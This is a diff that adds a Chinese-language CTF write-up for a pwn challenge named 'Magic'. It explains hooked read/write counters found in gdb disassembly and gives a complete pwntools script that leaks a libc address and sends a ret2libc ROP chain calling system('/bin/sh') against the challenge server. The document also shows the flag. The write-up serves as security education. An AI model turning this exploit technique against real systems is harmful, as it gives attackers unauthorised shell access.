@@ -417,7 +417,147 @@ print(p.recv().decode())
 
 ### Magic
 
-To be written...
+1. 嘗試幾次輸入之後，會發現有時候會突然 read 或 write 很多 bytes。
+2. 用 `gdb` 追進去發現正常 `read` 結束後會另外計算 `read` 和 `write` 的次數。
+
+```python
+   0x401d06    push   rax
+   0x401d07    push   rdi
+   0x401d08    push   rsi
+   0x401d09    push   rdx
+   0x401d0a    mov    rax, 1
+   0x401d11    mov    rdi, 0
+   0x401d18    mov    rsi, 0x404f20
+   0x401d1f    mov    rdx, 5
+   0x401d26    syscall              // write(stdout, 0x404f20, 5)
+   0x401d28    pop    rdx
+   0x401d29    pop    rsi
+   0x401d2a    pop    rdi
+   0x401d2b    pop    rax
+   0x401d2c    mov    rax, 0x404f00
+   0x401d33    add    qword ptr [rax], 1
+   0x401d37    mov    rax, qword ptr [rax]
+   0x401d3a    mov    rbx, 0x404f08
+   0x401d41    mov    rbx, qword ptr [rbx]
+   0x401d44    mov    r8, 0x404f10          // original read
+   0x401d4b    mov    r8, qword ptr [r8]
+   0x401d4e    cmp    rax, 0xe     // check: [0x404f00] == 0xe
+   0x401d52    jne    0x401d61
+   0x401d54    cmp    rbx,0x8      // check: [0x404f08] == 0x8
+   0x401d58    jne    0x401d61
+   0x401d5a    mov    rdx,0x1000
+   0x401d61    jmp    r8
+```
+
+3. `write` 也有同樣的操作。
+
+```python
+   0x401e00    push   rax
+   0x401e01    push   rdi
+   0x401e02    push   rsi
+   0x401e03    push   rdx
+   0x401e04    mov    rax,0x1
+   0x401e0b    mov    rdi,0x0
+   0x401e12    mov    rsi,0x404f28
+   0x401e19    mov    rdx,0x5
+   0x401e20    syscall
+   0x401e22    pop    rdx
+   0x401e23    pop    rsi
+   0x401e24    pop    rdi
+   0x401e25    pop    rax
+   0x401e26    mov    rax,0x404f08
+   0x401e2d    add    QWORD PTR [rax],0x1
+   0x401e31    mov    rax,QWORD PTR [rax]
+   0x401e34    mov    rbx,0x404f00
+   0x401e3b    mov    rbx,QWORD PTR [rbx]
+   0x401e3e    mov    r8,0x404f18
+   0x401e45    mov    r8,QWORD PTR [r8]
+   0x401e48    cmp    rax,0x3
+   0x401e4c    jne    0x401e5b
+   0x401e4e    cmp    rbx,0x7
+   0x401e52    jne    0x401e5b
+   0x401e54    mov    rdx,0x100
+   0x401e5b    jmp    r8
+```
+
+4. 整理一下可以發現當 `read` 2 次、 `write` 3 次時可以 read 0x100 bytes，而當 `read` 3 次、 `write` 8 次時可以寫 0x1000 bytes。各個 memory 紀錄的數值如下：
+
+  - `[0x404f00]` counts how many time read been called
+  - `[0x404f08]` counts how many time write been called
+  - `[0x404f10]` original read
+  - `[0x404f18]` original write
+
+5. 因此我們可以用 `read` 0x100 bytes 來 leak glibc (libc version 可從提供的 container 得知)，然後用 `write` 0x1000 bytes 做 ret2libc。
+
+```python
+from pwn import *
+
+#p = remote('127.0.0.1', 12348)
+p = remote('chals1.ais3.org', 12348)
+debug = False
+
+#p = process('./magic/share/magic')
+#p = gdb.debug('./magic/share/magic', gdbscript='continue')
+#debug = True
+
+def read():
+    print('[*] Reading')
+    print(p.recvuntil(b'> '))
+    p.sendline(b'w')
+    data = p.recvuntil(b'read')[:-4]
+    print('[*] Read', data)
+    return data
+
+def write(data=b'A'):
+    print('[*] Writing')
+    print(p.recvuntil(b'> '))
+    p.sendline(b'r')
+    p.send(data)
+    print('[*] Written', data)
+    return
+
+def super_read():
+    write()
+    write()
+    read()
+    read()
+    data = read()
+    return data
+
+def super_write(payload):
+    for _ in range(5):
+        read()
+    write(payload)
+
+# leak libc: version libc6_2.31-0ubuntu9.2_amd64
+leak = super_read()
+print('leak:', leak)
+
+if debug:
+    libc = int.from_bytes(leak[22:22+8], 'little') - 0x240b3
+else:
+    libc = int.from_bytes(leak[27:27+8], 'little') - 0x240b3
+print(f'[+] Libc base: {libc:#2x}')
+padding = b'A'*22
+system = libc + 0x522c0
+bin_sh = libc + 0x1b45bd
+pop_rdi = 0x401313
+ret = 0x40101a
+
+payload = padding
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(ret)
+payload += p64(system)
+print(payload)
+super_write(payload)
+p.sendline(b'c')
+p.interactive()
+
+```
+
+**Flag: `AIS3{ma4a4a4aGiCian}`**
+
 
 ### UTF-8 Editor — Crash
 
